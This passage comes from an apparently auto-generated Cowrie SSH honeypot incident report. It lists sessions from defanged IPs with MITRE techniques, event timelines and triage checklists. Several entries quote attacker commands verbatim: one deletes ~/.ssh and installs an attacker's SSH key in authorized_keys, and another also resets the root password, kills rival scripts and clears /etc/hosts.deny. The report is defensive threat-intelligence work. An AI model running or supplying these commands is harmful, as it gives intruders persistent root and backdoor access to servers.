| `2026-06-12 13:41:41` | `cowrie.command.failed` |
| `2026-06-12 13:41:42` | `cowrie.log.closed` |
| `2026-06-12 13:41:42` | `cowrie.session.params` |
| `2026-06-12 13:41:42` | `cowrie.command.input` |
| `2026-06-12 13:41:42` | `cowrie.session.file_download` |
| `2026-06-12 13:41:42` | `cowrie.log.closed` |
| `2026-06-12 13:41:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443700d1fa4f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:41 |
| **Last Seen** | 2026-06-12 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:41:45` | `cowrie.session.connect` |
| `2026-06-12 13:41:45` | `cowrie.client.version` |
| `2026-06-12 13:41:45` | `cowrie.client.kex` |
| `2026-06-12 13:41:46` | `cowrie.login.success` |
| `2026-06-12 13:41:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0bfe2078de8

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 13:41 |
| **Last Seen** | 2026-06-12 13:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:41:57` | `cowrie.session.connect` |
| `2026-06-12 13:41:57` | `cowrie.client.version` |
| `2026-06-12 13:41:57` | `cowrie.client.kex` |
| `2026-06-12 13:41:58` | `cowrie.login.success` |
| `2026-06-12 13:41:59` | `cowrie.session.params` |
| `2026-06-12 13:41:59` | `cowrie.command.input` |
| `2026-06-12 13:41:59` | `cowrie.command.failed` |
| `2026-06-12 13:41:59` | `cowrie.log.closed` |
| `2026-06-12 13:42:00` | `cowrie.session.params` |
| `2026-06-12 13:42:00` | `cowrie.command.input` |
| `2026-06-12 13:42:00` | `cowrie.session.file_download` |
| `2026-06-12 13:42:00` | `cowrie.log.closed` |
| `2026-06-12 13:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a727ff8c9710

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 13:42 |
| **Last Seen** | 2026-06-12 13:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:42:04` | `cowrie.session.connect` |
| `2026-06-12 13:42:04` | `cowrie.client.version` |
| `2026-06-12 13:42:05` | `cowrie.client.kex` |
| `2026-06-12 13:42:06` | `cowrie.login.success` |
| `2026-06-12 13:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63ac284e664

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:43 |
| **Last Seen** | 2026-06-12 13:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:43:39` | `cowrie.session.connect` |
| `2026-06-12 13:43:39` | `cowrie.client.version` |
| `2026-06-12 13:43:39` | `cowrie.client.kex` |
| `2026-06-12 13:43:40` | `cowrie.login.success` |
| `2026-06-12 13:43:41` | `cowrie.session.params` |
| `2026-06-12 13:43:41` | `cowrie.command.input` |
| `2026-06-12 13:43:41` | `cowrie.command.failed` |
| `2026-06-12 13:43:41` | `cowrie.log.closed` |
| `2026-06-12 13:43:41` | `cowrie.session.params` |
| `2026-06-12 13:43:41` | `cowrie.command.input` |
| `2026-06-12 13:43:41` | `cowrie.session.file_download` |
| `2026-06-12 13:43:41` | `cowrie.log.closed` |
| `2026-06-12 13:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99f33b7df6b

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:43 |
| **Last Seen** | 2026-06-12 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:43:45` | `cowrie.session.connect` |
| `2026-06-12 13:43:45` | `cowrie.client.version` |
| `2026-06-12 13:43:45` | `cowrie.client.kex` |
| `2026-06-12 13:43:46` | `cowrie.login.success` |
| `2026-06-12 13:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff2bb6b50f93

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 13:46 |
| **Last Seen** | 2026-06-12 13:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:46:03` | `cowrie.session.connect` |
| `2026-06-12 13:46:03` | `cowrie.client.version` |
| `2026-06-12 13:46:03` | `cowrie.client.kex` |
| `2026-06-12 13:46:04` | `cowrie.login.success` |
| `2026-06-12 13:46:05` | `cowrie.session.params` |
| `2026-06-12 13:46:05` | `cowrie.command.input` |
| `2026-06-12 13:46:05` | `cowrie.command.failed` |
| `2026-06-12 13:46:05` | `cowrie.log.closed` |
| `2026-06-12 13:46:06` | `cowrie.session.params` |
| `2026-06-12 13:46:06` | `cowrie.command.input` |
| `2026-06-12 13:46:06` | `cowrie.session.file_download` |
| `2026-06-12 13:46:06` | `cowrie.log.closed` |
| `2026-06-12 13:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889085785de6

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 13:46 |
| **Last Seen** | 2026-06-12 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:46:09` | `cowrie.session.connect` |
| `2026-06-12 13:46:09` | `cowrie.client.version` |
| `2026-06-12 13:46:09` | `cowrie.client.kex` |
| `2026-06-12 13:46:10` | `cowrie.login.success` |
| `2026-06-12 13:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d1fd1b73ce3

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:47 |
| **Last Seen** | 2026-06-12 13:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:47:42` | `cowrie.session.connect` |
| `2026-06-12 13:47:42` | `cowrie.client.version` |
| `2026-06-12 13:47:42` | `cowrie.client.kex` |
| `2026-06-12 13:47:43` | `cowrie.login.success` |
| `2026-06-12 13:47:43` | `cowrie.session.params` |
| `2026-06-12 13:47:43` | `cowrie.command.input` |
| `2026-06-12 13:47:43` | `cowrie.command.failed` |
| `2026-06-12 13:47:43` | `cowrie.log.closed` |
| `2026-06-12 13:47:44` | `cowrie.session.params` |
| `2026-06-12 13:47:44` | `cowrie.command.input` |
| `2026-06-12 13:47:44` | `cowrie.session.file_download` |
| `2026-06-12 13:47:44` | `cowrie.log.closed` |
| `2026-06-12 13:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad52a9f636ca

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:47 |
| **Last Seen** | 2026-06-12 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:47:47` | `cowrie.session.connect` |
| `2026-06-12 13:47:47` | `cowrie.client.version` |
| `2026-06-12 13:47:47` | `cowrie.client.kex` |
| `2026-06-12 13:47:48` | `cowrie.login.success` |
| `2026-06-12 13:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c52c3faffa4

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:51 |
| **Last Seen** | 2026-06-12 13:51 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9KN1pDM2DK6x"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:51:31` | `cowrie.session.connect` |
| `2026-06-12 13:51:31` | `cowrie.client.version` |
| `2026-06-12 13:51:31` | `cowrie.client.kex` |
| `2026-06-12 13:51:32` | `cowrie.login.success` |
| `2026-06-12 13:51:32` | `cowrie.session.params` |
| `2026-06-12 13:51:32` | `cowrie.command.input` |
| `2026-06-12 13:51:32` | `cowrie.command.failed` |
| `2026-06-12 13:51:33` | `cowrie.log.closed` |
| `2026-06-12 13:51:33` | `cowrie.session.params` |
| `2026-06-12 13:51:33` | `cowrie.command.input` |
| `2026-06-12 13:51:33` | `cowrie.session.file_download` |
| `2026-06-12 13:51:33` | `cowrie.log.closed` |
| `2026-06-12 13:51:43` | `cowrie.session.params` |
| `2026-06-12 13:51:43` | `cowrie.command.input` |
| `2026-06-12 13:51:43` | `cowrie.log.closed` |
| `2026-06-12 13:51:43` | `cowrie.session.params` |
| `2026-06-12 13:51:43` | `cowrie.command.input` |
| `2026-06-12 13:51:44` | `cowrie.log.closed` |
| `2026-06-12 13:51:44` | `cowrie.session.params` |
| `2026-06-12 13:51:44` | `cowrie.command.input` |
| `2026-06-12 13:51:44` | `cowrie.session.file_download` |
| `2026-06-12 13:51:44` | `cowrie.log.closed` |
| `2026-06-12 13:51:44` | `cowrie.session.params` |
| `2026-06-12 13:51:44` | `cowrie.command.input` |
| `2026-06-12 13:51:45` | `cowrie.log.closed` |
| `2026-06-12 13:51:45` | `cowrie.session.params` |
| `2026-06-12 13:51:45` | `cowrie.command.input` |
| `2026-06-12 13:51:45` | `cowrie.log.closed` |
| `2026-06-12 13:51:45` | `cowrie.session.params` |
| `2026-06-12 13:51:45` | `cowrie.command.input` |
| `2026-06-12 13:51:45` | `cowrie.command.input` |
| `2026-06-12 13:51:46` | `cowrie.log.closed` |
| `2026-06-12 13:51:46` | `cowrie.session.params` |
| `2026-06-12 13:51:46` | `cowrie.command.input` |
| `2026-06-12 13:51:46` | `cowrie.log.closed` |
| `2026-06-12 13:51:46` | `cowrie.session.params` |
| `2026-06-12 13:51:46` | `cowrie.command.input` |
| `2026-06-12 13:51:47` | `cowrie.log.closed` |
| `2026-06-12 13:51:47` | `cowrie.session.params` |
| `2026-06-12 13:51:47` | `cowrie.command.input` |
| `2026-06-12 13:51:47` | `cowrie.log.closed` |
| `2026-06-12 13:51:47` | `cowrie.session.params` |
| `2026-06-12 13:51:47` | `cowrie.command.input` |
| `2026-06-12 13:51:47` | `cowrie.log.closed` |
| `2026-06-12 13:51:48` | `cowrie.session.params` |
| `2026-06-12 13:51:48` | `cowrie.command.input` |
| `2026-06-12 13:51:48` | `cowrie.log.closed` |
| `2026-06-12 13:51:48` | `cowrie.session.params` |
| `2026-06-12 13:51:48` | `cowrie.command.input` |
| `2026-06-12 13:51:48` | `cowrie.log.closed` |
| `2026-06-12 13:51:49` | `cowrie.session.params` |
| `2026-06-12 13:51:49` | `cowrie.command.input` |
| `2026-06-12 13:51:49` | `cowrie.log.closed` |
| `2026-06-12 13:51:49` | `cowrie.session.params` |
| `2026-06-12 13:51:49` | `cowrie.command.input` |
| `2026-06-12 13:51:49` | `cowrie.log.closed` |
| `2026-06-12 13:51:49` | `cowrie.session.params` |
| `2026-06-12 13:51:49` | `cowrie.command.input` |
| `2026-06-12 13:51:50` | `cowrie.log.closed` |
| `2026-06-12 13:51:50` | `cowrie.session.params` |
| `2026-06-12 13:51:50` | `cowrie.command.input` |
| `2026-06-12 13:51:50` | `cowrie.log.closed` |
| `2026-06-12 13:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b62e24073c

| Field | Detail |
|---|---|
| **Source IP** | `46.77.69[.]201` |
| **First Seen** | 2026-06-12 13:52 |
| **Last Seen** | 2026-06-12 13:52 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:52:20` | `cowrie.session.connect` |
| `2026-06-12 13:52:25` | `cowrie.client.version` |
| `2026-06-12 13:52:25` | `cowrie.client.kex` |
| `2026-06-12 13:52:34` | `cowrie.login.success` |
| `2026-06-12 13:52:35` | `cowrie.direct-tcpip.request` |
| `2026-06-12 13:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.77.69[.]201` to AbuseIPDB if not already reported
- [ ] Block `46.77.69[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68b945654594

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 13:52 |
| **Last Seen** | 2026-06-12 13:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:52:34` | `cowrie.session.connect` |
| `2026-06-12 13:52:34` | `cowrie.client.version` |
| `2026-06-12 13:52:34` | `cowrie.client.kex` |
| `2026-06-12 13:52:35` | `cowrie.login.success` |
| `2026-06-12 13:52:36` | `cowrie.session.params` |
| `2026-06-12 13:52:36` | `cowrie.command.input` |
| `2026-06-12 13:52:36` | `cowrie.command.failed` |
| `2026-06-12 13:52:36` | `cowrie.log.closed` |
| `2026-06-12 13:52:36` | `cowrie.session.params` |
| `2026-06-12 13:52:36` | `cowrie.command.input` |
| `2026-06-12 13:52:37` | `cowrie.session.file_download` |
| `2026-06-12 13:52:37` | `cowrie.log.closed` |
| `2026-06-12 13:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef0a87b2deb

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 13:52 |
| **Last Seen** | 2026-06-12 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:52:40` | `cowrie.session.connect` |
| `2026-06-12 13:52:40` | `cowrie.client.version` |
| `2026-06-12 13:52:40` | `cowrie.client.kex` |
| `2026-06-12 13:52:41` | `cowrie.login.success` |
| `2026-06-12 13:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76753369227b

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-06-12 13:52 |
| **Last Seen** | 2026-06-12 13:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:52:40` | `cowrie.session.connect` |
| `2026-06-12 13:52:41` | `cowrie.client.version` |
| `2026-06-12 13:52:41` | `cowrie.client.kex` |
| `2026-06-12 13:52:43` | `cowrie.login.success` |
| `2026-06-12 13:52:43` | `cowrie.direct-tcpip.request` |
| `2026-06-12 13:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-846cb74a8937

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:52 |
| **Last Seen** | 2026-06-12 13:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:52:42` | `cowrie.session.connect` |
| `2026-06-12 13:52:42` | `cowrie.client.version` |
| `2026-06-12 13:52:42` | `cowrie.client.kex` |
| `2026-06-12 13:52:42` | `cowrie.login.success` |
| `2026-06-12 13:52:43` | `cowrie.session.params` |
| `2026-06-12 13:52:43` | `cowrie.command.input` |
| `2026-06-12 13:52:43` | `cowrie.command.failed` |
| `2026-06-12 13:52:43` | `cowrie.log.closed` |
| `2026-06-12 13:52:43` | `cowrie.session.params` |
| `2026-06-12 13:52:43` | `cowrie.command.input` |
| `2026-06-12 13:52:43` | `cowrie.session.file_download` |
| `2026-06-12 13:52:43` | `cowrie.log.closed` |
| `2026-06-12 13:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
